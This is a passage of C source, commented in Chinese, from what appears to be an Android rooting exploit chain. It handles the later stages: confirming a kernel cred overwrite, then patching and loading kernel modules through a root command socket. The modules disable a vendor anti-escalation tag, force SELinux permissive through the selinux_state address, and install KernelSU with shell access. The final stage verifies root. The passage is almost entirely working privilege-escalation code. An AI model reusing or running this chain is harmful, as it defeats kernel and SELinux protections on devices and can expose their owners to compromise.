            if (e == 1) LOG("STAGE5 r%d/%zu: glt timeout", round, i);
            char *proof = read_file(proof_path);
            int hit = proof && strstr(proof, "CAPSROOT");
            free(proof);
            if (hit) {
                LOG("STAGE5 OK (round %d): CAPSROOT via cred 0x%llx", round,
                    (unsigned long long)cred);
                /* 不杀 w2host！rootcmd 服务端（w2host 父进程）是 STAGE6 insmod
                 * 通道，kill 后 STAGE6 socket unreachable（2026-08-29 shell17
                 * 实证：STAGE5 OK 后 kill_w2host → STAGE6 FAIL）。
                 * PC 原版 root_full_permissive_restore.ps1 STAGE5 成功后无
                 * kill（489 行直接 sleep 3s 进 STAGE6）。 */
                return 0;
            }
        }
        LOG("STAGE5 round %d: no proof", round);
    }
    LOG("STAGE5 FAIL: 3 rounds x %zu cands", nt);
    kill_w2host(cfg);
    return -1;
}

/* ---------- STAGE6 insmod 链 ---------- */
int stage6_insmod(const RunnerCfg *cfg, const SymTab *ksym) {
    char sock[512];
    snprintf(sock, sizeof(sock), "%s/rootcmd_%s.sock", cfg->work, cfg->tag);

    /* rootcmd 可用性 */
    char *id = rootcmd_call(sock, "ID");
    if (!id) { LOG("STAGE6 FAIL: rootcmd socket unreachable"); return -1; }
    LOG("STAGE6: rootcmd ID -> %s", id);
    free(id);

    /* 需要的 ko 路径（patch 版供 insmod，与 root.ps1 STAGE3.5 语义一致：
     * 设备端用迷你 patcher 现场重打符号 = patch_ko_all.py 的 C 移植） */
    char cv[512], pr[512], ksu[512];
    char cvpat[512], prpat[512], ksupat[512];
    snprintf(cv, sizeof(cv), "%s/clear_vr_tag.ko", cfg->work);
    snprintf(pr, sizeof(pr), "%s/permissive_restore.ko", cfg->work);
    snprintf(ksu, sizeof(ksu), "%s/kernelsu.ko", cfg->work);
    snprintf(cvpat, sizeof(cvpat), "%s/clear_vr_tag.patched.ko", cfg->work);
    snprintf(prpat, sizeof(prpat), "%s/permissive_restore.patched.ko", cfg->work);
    snprintf(ksupat, sizeof(ksupat), "%s/kernelsu.patched.ko", cfg->work);

    /* STAGE3.5（设备端版）：三个 ko 全部现场 patch（UNDEF→绝对 VA + __versions 清空）。
     * 与 root.ps1 的 patch_ko_all.py 输出语义一致（符号表为本 boot 现场读的 /proc/kallsyms）。 */
    {
        int w1 = patch_ko(cv, cvpat, ksym);
        int w2 = patch_ko(pr, prpat, ksym);
        int w3 = cfg->manager_package ? 0 : patch_ko(ksu, ksupat, ksym);
        if (w1 < 0 || w2 < 0 || w3 < 0) {
            LOG("STAGE6 FAIL: ko patch 失败 (cv=%d pr=%d ksu=%d)", w1, w2, w3);
            return -1;
        }
        LOG("STAGE3.5: ko patched (clear_vr_tag=%d permissive_restore=%d kernelsu=%d syms)",
            w1, w2, w3);
    }

    /* STAGE6.0a：先清 vr tag（防 sys_exit 杀提权进程），参数 cc_addr=commit_creds VA */
    uint64_t cc = symtab_find(ksym, "commit_creds");
    if (cc == 0) { LOG("STAGE6 FAIL: commit_creds not found"); return -1; }
    char cc_s[64];
    hex64(cc_s, sizeof(cc_s), cc);
    {
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "INSMOD %s cc_addr=%s tag_a_off=%d tag_b_off=%d tp_flag=%d",
                 cvpat, cc_s, DEV_VR_TAG_A, DEV_VR_TAG_B, DEV_VR_TP);
        char *r = rootcmd_call(sock, cmd);
        LOG("STAGE6.0a clear_vr_tag: %s", r ? r : "(no reply)");
        free(r);
        /* 校验已加载（root.ps1 同款：未加载则后续提权进程会被 vr.ko 杀） */
        char out[256] = {0};
        sh_run("cat /proc/modules 2>/dev/null | grep '^clear_vr_tag'", out, sizeof(out));
        if (strstr(out, "clear_vr_tag") == NULL) {
            LOG("STAGE6.0a FAIL: clear_vr_tag 未加载 ('%s') -> ksud 落位不可靠", out);
            return -1;
        }
        LOG("STAGE6.0a OK: clear_vr_tag loaded");
    }

    /* permissive_restore：RMMOD 旧 → INSMOD selinux_state_p0=se_p0 gl_zeroes_p0=GL_LOCK_BASE */
    {
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "RMMOD permissive_restore");
        char *r = rootcmd_call(sock, cmd);
        free(r);
        snprintf(cmd, sizeof(cmd), "RMMOD myroot");
        r = rootcmd_call(sock, cmd);
        free(r);
        char se_s[64], zero_s[64];
        hex64(se_s, sizeof(se_s), DEV_SE_P0);
        hex64(zero_s, sizeof(zero_s), DEV_GL_LOCK_BASE);
        char cmd2[1024];
        snprintf(cmd2, sizeof(cmd2), "INSMOD %s selinux_state_p0=%s gl_zeroes_p0=%s",
                 prpat, se_s, zero_s);
        r = rootcmd_call(sock, cmd2);
        LOG("STAGE6.0 permissive_restore: %s", r ? r : "(no reply)");
        if (cfg->manager_package) {
            int pid = -1;
            const char *start = r ? strstr(r, "MANAGER_START ") : NULL;
            if (!start || sscanf(start, "MANAGER_START %d", &pid) != 1 || pid <= 0) {
                free(r);
                LOG("STAGE6 FAIL: manager launcher unavailable in module-init root window");
                return -1;
            }
        }
        free(r);
    }

    /* 等 ksetup 标记（w2host 落位 /data/adb/ksud 后写） */
    char mark_path[512];
    snprintf(mark_path, sizeof(mark_path), "%s/ksetup_mark.txt", cfg->work);
    int ksetup_ok = 0;
    for (int i = 0; i < 30; i++) {
        sleep_s(2);
        char *mk = read_file(mark_path);
        if (mk && strstr(mk, "KSETUP_OK")) {
            ksetup_ok = 1;
            free(mk);
            break;
        }
        free(mk);
    }
    if (!ksetup_ok) { LOG("STAGE6 FAIL: ksud not installed (no KSETUP_OK in 60s)"); return -1; }
    LOG("STAGE6: ksud installed (KSETUP_OK)");

    if (cfg->manager_package) {
        LOG("STAGE6: manager late-load launched in module-init root context: %s", cfg->manager_package);
        gl_state_reset(cfg->work);
        return 0; /* Never load bundled kernelsu.ko in manager mode. */
    }

    /* kernelsu INSMOD（rootcmd 通道，趁 socket 还通；用 patched 版） */
    {
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "INSMOD %s allow_shell=1", ksupat);
        char *r = rootcmd_call(sock, cmd);
        LOG("STAGE6.1 kernelsu insmod: %s", r ? r : "(no reply)");
        free(r);
    }

    /* 槽位重置（permissive_restore init 已清零宿主 → 无限提权） */
    gl_state_reset(cfg->work);

    /* STAGE6.5：clear_vr_tag 已加载则跳过，否则 su -c insmod（rootcmd 可能已被 KSU 阻断） */
    {
        char out[256] = {0};
        sh_run("lsmod | grep -q clear_vr_tag", out, sizeof(out));
        int loaded = (sh_run("lsmod", out, sizeof(out)) == 0) &&
                     (strstr(out, "clear_vr_tag") != NULL);
        if (!loaded) {
            char cmd[1024];
            snprintf(cmd, sizeof(cmd), "su -c insmod %s", cvpat);
            LOG("STAGE6.5: clear_vr_tag not loaded, retry via su");
            sh_run(cmd, out, sizeof(out));
        }
    }
    return 0;
}

/* ---------- STAGE7 验证 ---------- */
static void manager_dump_log(const RunnerCfg *cfg) {
    char path[512];
    snprintf(path, sizeof(path), "%s/manager_load.log", cfg->work);
    char *text = read_file(path);
    if (text) { LOG("MANAGER loader log:\n%.8192s", text); free(text); }
    snprintf(path, sizeof(path), "%s/manager_load.status", cfg->work);
    text = read_file(path);
    if (text) { LOG("MANAGER loader status: %s", text); free(text); }
}

static int manager_verify(const RunnerCfg *cfg) {
    char status_path[512], hash_path[512], verify_path[512];
    snprintf(status_path, sizeof(status_path), "%s/manager_load.status", cfg->work);
    snprintf(hash_path, sizeof(hash_path), "%s/ksud.sha256", cfg->work);
    snprintf(verify_path, sizeof(verify_path), "%s/manager_verify.log", cfg->work);
    char *expected = read_file(hash_path);
    if (!expected || strlen(expected) != 65 || expected[64] != '\n') {
        free(expected); LOG("STAGE7 FAIL: missing manager daemon hash"); return -1;
    }
    expected[64] = 0;
    for (int i = 0; i < 64; i++) {
        if (!isxdigit((unsigned char)expected[i])) {
            free(expected); LOG("STAGE7 FAIL: invalid manager hash"); return -1;
        }
    }
    LOG("STAGE7: checking manager module, shell root and installed daemon (up to 120s)");
    time_t deadline = time(NULL) + 120;
    while (time(NULL) < deadline) {
        char *status = read_file(status_path);
        int exited = status && (strstr(status, "MANAGER_EXIT 0") || strstr(status, "MANAGER_EXISTING 0"));
        int failed = status && strstr(status, "MANAGER_FAIL ");
        free(status);
        if (failed) break;
        char *modules = read_file("/proc/modules");
        int loaded = modules && (strncmp(modules, "kernelsu ", 9) == 0 || strstr(modules, "\nkernelsu ") ||
                                 strncmp(modules, "sukisu ", 7) == 0 || strstr(modules, "\nsukisu ") ||
                                 strncmp(modules, "resukisu ", 9) == 0 || strstr(modules, "\nresukisu "));
        free(modules);
        if (loaded && exited) {
            char *args[] = {"/system/bin/sh", "-c",
                "timeout 6 su -c 'id; sha256sum /data/adb/ksud' 2>&1", NULL};
            int code = -1;
            int result = exec_timeout(args[0], args, NULL, verify_path, 8, &code);
            char *proof = read_file(verify_path);
            if (result == 0 && code == 0 && proof && strstr(proof, "uid=0(root)") &&
                strstr(proof, expected)) {
                LOG("STAGE7 OK: %s module loaded, su uid=0, installed ksud SHA-256 matches selected manager",
                    cfg->manager_package);
                LOG("MANAGER proof: %.1024s", proof);
                free(proof); free(expected);
                manager_dump_log(cfg);
                return 0;
            }
            free(proof);
        }
        sleep_s(2);
    }
    free(expected);
    manager_dump_log(cfg);
    char *proof = read_file(verify_path);
    if (proof) { LOG("MANAGER verify log: %.2048s", proof); free(proof); }
    LOG("STAGE7 FAIL: selected manager did not pass module/root/daemon checks; no bundled fallback. Reboot before retry.");
    return -1;
}

int stage_root_session(const RunnerCfg *cfg) {
    if (getuid() != 0 || geteuid() != 0) {
        LOG("ROOT_SESSION FAIL: runner is not uid0"); return -1;
    }
    if (!cfg->manager_package) {
        LOG("UI_STAGE START 8");
        LOG("STAGE7 OK: existing Shizuku root is available; no manager selected, nothing loaded");
        return 0;
    }
    char *modules = read_file("/proc/modules");
    if (!modules) { LOG("ROOT_SESSION FAIL: cannot inspect loaded modules"); return -1; }
    int loaded = strncmp(modules, "kernelsu ", 9) == 0 || strstr(modules, "\nkernelsu ") ||
                 strncmp(modules, "sukisu ", 7) == 0 || strstr(modules, "\nsukisu ") ||
                 strncmp(modules, "resukisu ", 9) == 0 || strstr(modules, "\nresukisu ");
    free(modules);
    char path[512], status_path[512];
    snprintf(status_path, sizeof(status_path), "%s/manager_load.status", cfg->work);
    if (loaded) {
        // Verify an existing installation; do not ask late-load to skip an old
        // kernel and then overwrite its userspace daemon with a different one.
        snprintf(path, sizeof(path), "%s/manager_identity.log", cfg->work);
        char *args[] = {"/system/bin/sh", "-c", "sha256sum /data/adb/ksud", NULL};
        int code = -1;
        int result = exec_timeout(args[0], args, NULL, path, 5, &code);
        char *actual = read_file(path);
        snprintf(path, sizeof(path), "%s/ksud.sha256", cfg->work);
        char *expected = read_file(path);
        int matches = result == 0 && code == 0 && actual && expected &&
                      strlen(expected) == 65 && expected[64] == '\n' &&
                      strncmp(actual, expected, 64) == 0;
        free(actual); free(expected);
        if (!matches) {
            LOG("ROOT_SESSION FAIL: existing manager module has a different or unreadable daemon; reboot and start Shizuku through wireless debugging before loading the selected manager");
            return -1;
        }
        LOG("ROOT_SESSION: existing manager module and matching daemon found; verifying without reloading");
        if (write_file(status_path, "MANAGER_EXISTING 0\n") != 0) return -1;
    } else {
        snprintf(path, sizeof(path), "%s/ksud", cfg->work);
        char log_path[512];
        snprintf(log_path, sizeof(log_path), "%s/manager_load.log", cfg->work);
        char *args[] = {path, "late-load", "--allow-shell", "--package-name",
                        (char *)cfg->manager_package, NULL};
        int code = -1;
        LOG("ROOT_SESSION: load selected manager directly using existing uid0: %s", cfg->manager_package);
        int result = exec_timeout(path, args, NULL, log_path, 120, &code);
        if (result != 0 || code != 0) {
            write_file(status_path, "MANAGER_FAIL 1\n");
            manager_dump_log(cfg);
            LOG("ROOT_SESSION FAIL: manager late-load failed (result=%d exit=%d)", result, code);
            return -1;
        }
        if (write_file(status_path, "MANAGER_EXIT 0\n") != 0) return -1;
    }
    LOG("UI_STAGE START 8");
    return manager_verify(cfg);
}

int stage7_verify(const RunnerCfg *cfg) {
    if (cfg->manager_package) return manager_verify(cfg);
    LOG("STAGE7: waiting 25s for stack settle");
    sleep_s(25);

    char out[512] = {0};
    /* 优先 rootcmd socket（w2host 被提权后是 root 通道，app 域同 uid 可用）；
     * app 域 exec sh 可能被 seccomp/SELinux 拦，su 作为 fallback。 */
    char sock[512];
    snprintf(sock, sizeof(sock), "%s/rootcmd_%s.sock", cfg->work, cfg->tag);
    char *r = rootcmd_call(sock, "ID");
    if (r && strstr(r, "uid=0")) {
        LOG("STAGE7: rootcmd ID -> %s", r);
        free(r);
    } else {
        free(r);
        sh_run("su -c id", out, sizeof(out));
        if (!strstr(out, "uid=0")) {
            LOG("STAGE7 FAIL: no root (rootcmd/su) -> %s", out);
            return -1;
        }
        LOG("STAGE7: su id -> %s", out);
    }

    /* ksud ELF magic（rootcmd EXEC 受限 uid2000，用 su fallback） */
    sh_run("su -c 'head -c 4 /data/adb/ksud' | xxd -p", out, sizeof(out));
    if (strstr(out, "7f454c46") == NULL) {
        LOG("STAGE7 WARN: ksud magic not ELF -> %s", out);
    } else {
        LOG("STAGE7: ksud ELF magic OK");
    }

    sh_run("su -c '/data/adb/ksud debug version'", out, sizeof(out));
    LOG("STAGE7: ksud debug version -> %s", out);

    sh_run("ping -c 3 -W 2 223.5.5.5 >/dev/null 2>&1 && echo NET_OK || echo NET_FAIL", out, sizeof(out));
    LOG("STAGE7: network -> %s", out);
    return 0;
}
